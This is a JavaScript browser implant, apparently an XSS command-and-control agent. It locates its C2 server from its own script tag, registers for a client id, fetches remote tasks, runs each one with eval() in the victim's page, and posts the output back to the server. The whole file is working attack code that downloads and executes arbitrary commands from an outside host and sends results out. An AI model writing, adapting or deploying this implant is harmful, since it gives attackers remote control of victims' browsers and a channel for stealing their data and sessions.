var clientid = null;
var scriptsrc = document.getElementById("hacker").getAttribute("src");
var c2server = scriptsrc.substring(0, scriptsrc.length - 11);


function run() {
    // make Ajax call here, inside the callback call:

    function register() {
        //register client with server in order to obtain client id

        console.debug("[*] registering client with c2server at:" + c2server + "/api/register");
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function () {
            if (xhttp.readyState == 4 && xhttp.status == 201) {
                var jsondata = JSON.parse(xhttp.responseText);
                clientid = jsondata.clientid;
                console.debug("[*] registered client id: " + clientid)
            }
        };
        xhttp.open("GET", c2server + "/api/register", true);
        xhttp.send();
    }
    function getTasks() {
        var getTaskRequest = new XMLHttpRequest();
        getTaskRequest.onreadystatechange = function () {
            if (getTaskRequest.readyState == 4 && getTaskRequest.status == 201) {
                var jsondata = JSON.parse(getTaskRequest.responseText);
                for (var i in jsondata.tasks) {
                    console.debug("[*] got task " + jsondata.tasks[i].id + ": " + jsondata.tasks[i].input)
                    var cmdout = eval(jsondata.tasks[i].input); //do the task
                    console.debug(cmdout); //log output locally
                    var taskCompleteRequest = new XMLHttpRequest();
                    taskCompleteRequest.onreadystatechange = function () {
                        if (taskCompleteRequest.readyState == 4 && taskCompleteRequest.status == 201) {
                            console.debug("[*] task complete: " + jsondata.tasks[i].id)
                        }
                    };
                    taskCompleteRequest.open("POST", c2server + "/api/tasks/"+jsondata.tasks[i].id, true);
                    taskCompleteRequest.setRequestHeader("Content-type","application/json");
                    taskCompleteRequest.send('{"tasks":[{"output":"'+String(cmdout)+'"}]}'); //log output remotely

                }


            }
        };
        getTaskRequest.open("GET", c2server + "/api/tasks/" + clientid, true);
        getTaskRequest.send();
        console.debug("[*] looking for tasks: " + clientid)
    }

    if (clientid == null) {
        register();
    }
    console.debug("[*] ping")
    getTasks();
    // setTimeout(poll, 5000); //uncomment this for prod
    // ...
}
run();